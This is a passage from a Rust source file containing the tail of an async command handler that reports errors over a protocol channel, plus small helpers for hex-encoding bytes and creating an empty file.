                object = object.put(protocol::key_error(), protocol::s(&error.to_string()));
            }
        }
        out.blocking_send(object.value());
        state.clear_cancellable(&command.id);
    })
    .await
    .ok();
}

fn hex(data: &[u8]) -> String {
    let mut output = String::with_capacity(data.len() * 2);
    for byte in data {
        output.push_str(&format!("{byte:02x}"));
    }
    output
}

#[allow(dead_code)]
fn ensure_file(path: &Path) -> Result<()> {
    let mut file = File::create(path).context("create file")?;
    file.write_all(b"")?;
    Ok(())
}
